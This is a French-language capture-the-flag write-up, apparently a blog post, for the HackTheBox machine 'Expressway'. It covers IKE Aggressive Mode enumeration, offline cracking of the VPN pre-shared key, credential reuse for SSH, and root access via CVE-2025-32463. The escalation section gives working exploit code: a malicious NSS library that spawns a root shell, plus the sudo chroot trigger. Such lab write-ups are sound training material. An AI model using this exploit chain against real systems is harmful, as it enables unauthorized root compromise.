---
title: "HackTheBox - Expressway"
date: 2026-02-13 14:00:00 +0200
categories: [HackTheBox, Machines]
tags: [ipsec, ike-scan, vpn, strongswan, psk-crack, squid, sudo, cve-2025-32463, privilege-escalation]
description: "Write-up de la machine Expressway - Exploitation d'un VPN IPsec, cracking de Pre-Shared Key et escalade de privilèges via CVE-2025-32463 (sudo chroot)"
image:
  path: /assets/img/posts/expressway/expressway.png
  alt: "HackTheBox - Expressway"
---

## Informations sur la machine

| Propriété    | Valeur           |
|-------------|------------------|
| **OS**      | Linux            |
| **Difficulté** | Easy        |
| **Points**  | 20               |
| **IP**      | 10.129.3.110     |

---

## Reconnaissance

### Scan TCP

Un premier scan TCP ne révèle qu'un service SSH sur le port 22.

```bash
nmap -sC -sV 10.129.3.110
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

### Scan UDP

Le scan UDP s'avère bien plus intéressant et révèle des services liés à un VPN IPsec.

```bash
nmap -sU --top-ports 100 10.129.3.110
```

```
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

> La présence des ports ISAKMP (500) et NAT-T (4500) indique un service VPN IPsec. Le port TFTP (69) pourrait contenir des fichiers de configuration intéressants.
{: .prompt-info }

---

## Énumération IKE

### Identification du transform set

Avec `ike-scan`, on identifie la configuration IKE du serveur en Main Mode.

```bash
ike-scan -M 10.129.3.110
```

```
10.129.3.110    Main Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

Le serveur utilise **3DES/SHA1/DH Group 2** avec authentification par **Pre-Shared Key** et **XAUTH** (Cisco Extended Authentication).

### Aggressive Mode et leak d'identité

En testant l'Aggressive Mode, le serveur accepte n'importe quel Group ID et leak l'identité du serveur.

```bash
ike-scan -M -A --id=vpn 10.129.3.110
```

```
10.129.3.110    Aggressive Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    Hash(20 bytes)
```

On récupère l'identité **`ike@expressway.htb`** et un hash de la PSK.

---

## Cracking de la Pre-Shared Key

### Capture du hash

On capture le hash dans un format crackable avec l'option `--pskcrack`.

```bash
ike-scan -M -A --id=vpn 10.129.3.110 --pskcrack=hash.txt
```

### Cracking avec psk-crack

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

```
key "freakingrockstarontheroad" matches SHA1 hash 2d5ef680d9828c455b8d242a6822e5c9e30bf4f5
```

> La Pre-Shared Key est **`freakingrockstarontheroad`**.
{: .prompt-tip }

---

## Établissement du tunnel VPN

### Configuration de strongSwan

Après plusieurs tentatives avec `vpnc` (qui échouait avec des erreurs d'exchange type), la connexion a été établie avec **strongSwan**.

```bash
sudo tee /etc/ipsec.conf << 'EOF'
config setup

conn expressway
    keyexchange=ikev1
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=tunnel
    authby=secret
    xauth=client
    xauth_identity=ike@expressway.htb
    left=%defaultroute
    right=10.129.3.110
    rightid=ike@expressway.htb
    rightsubnet=172.16.0.0/16
    aggressive=yes
    auto=add
EOF
```

```bash
sudo tee /etc/ipsec.secrets << 'EOF'
: PSK "freakingrockstarontheroad"
ike@expressway.htb : XAUTH "freakingrockstarontheroad"
EOF
```

### Connexion

```bash
sudo ipsec restart
sudo ipsec up expressway
```

```
IKE_SA expressway[1] established between 10.10.15.52[10.10.15.52]...10.129.3.110[ike@expressway.htb]
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
CHILD_SA expressway{1} established with SPIs [...] and TS 10.10.15.52/32 === 172.16.0.0/16
connection 'expressway' established successfully
```

> Le paramètre `rightid=ike@expressway.htb` est essentiel. Sans lui, strongSwan rejette la connexion car l'identité distante ne matche pas l'IP du serveur.
{: .prompt-warning }

---

## Accès SSH

Les mêmes identifiants utilisés pour le VPN fonctionnent également pour SSH.

```bash
ssh -o KexAlgorithms=curve25519-sha256 ike@expressway.htb
```

> L'option `-o KexAlgorithms=curve25519-sha256` est nécessaire car la négociation ML-KEM (post-quantum) par défaut entre OpenSSH 10.x côté client et serveur provoque un hang lors du key exchange.
{: .prompt-warning }

**Mot de passe :** `freakingrockstarontheroad`

```bash
ike@expressway:~$ cat user.txt
```

---

## Escalade de privilèges

### Énumération

L'énumération du système révèle plusieurs éléments intéressants.

**Binaires SUID :**

```bash
find / -perm -4000 -type f 2>/dev/null
```

Deux binaires attirent l'attention :
- `/usr/sbin/exim4` — SUID root, Exim 4.98.2
- `/usr/local/bin/sudo` — SUID root, **Sudo 1.9.17** (compilé custom, non-stripped)

**Groupe proxy et Squid :**

L'utilisateur `ike` est membre du groupe `proxy`, donnant accès aux logs Squid qui révèlent un sous-domaine interne :

```bash
cat /var/log/squid/access.log.1 | grep expressway
```

```
TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

### Identification de la vulnérabilité

La présence de **deux versions de sudo** est suspecte :

```bash
/usr/bin/sudo --version     # Sudo 1.9.13p3 (281 KB)
/usr/local/bin/sudo --version  # Sudo 1.9.17 (1 MB, custom build)
```

La version 1.9.17 installée dans `/usr/local/bin/` (prioritaire dans le PATH) est vulnérable à **CVE-2025-32463**, une faille critique (CVSS 9.3) surnommée **"chwoot"**.

> Cette vulnérabilité permet à n'importe quel utilisateur local d'obtenir un shell root en abusant de l'option `-R` (--chroot) de sudo, même sans être listé dans le fichier sudoers.
{: .prompt-danger }

### Exploitation — CVE-2025-32463

Le principe est simple : sudo avec l'option `-R` effectue un `chroot()` dans le répertoire spécifié **avant** d'évaluer les privilèges. En créant un faux `nsswitch.conf` dans ce répertoire, on force sudo à charger une bibliothèque partagée malveillante avec les privilèges root.

```bash
# Création du répertoire de travail
STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
cd $STAGE

# Code de la bibliothèque malveillante
cat > woot1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
EOF

# Structure du faux chroot
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

# Compilation
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

# Exploitation
sudo -R woot woot
```

```bash
root@expressway:/tmp/sudowoot.XXXXXX# id
uid=0(root) gid=0(root) groups=0(root)
root@expressway:/tmp/sudowoot.XXXXXX# cat /root/root.txt
```

---

## Leçons apprises

- **Ne pas négliger les scans UDP** : les services VPN IPsec sont souvent invisibles en TCP
- **L'Aggressive Mode IKE** est dangereux car il expose le hash de la PSK, permettant un cracking offline
- **La réutilisation de credentials** (PSK → SSH) est un vecteur d'attaque courant en environnement d'entreprise
- **Les versions custom de binaires système** (ici sudo dans `/usr/local/bin/`) sont souvent des indicateurs de vulnérabilités intentionnelles ou de mauvaises pratiques
- **CVE-2025-32463** démontre les risques liés à l'évaluation de chemins dans un contexte chroot avant la vérification des privilèges

**Machine complété**

{% include comments.html %}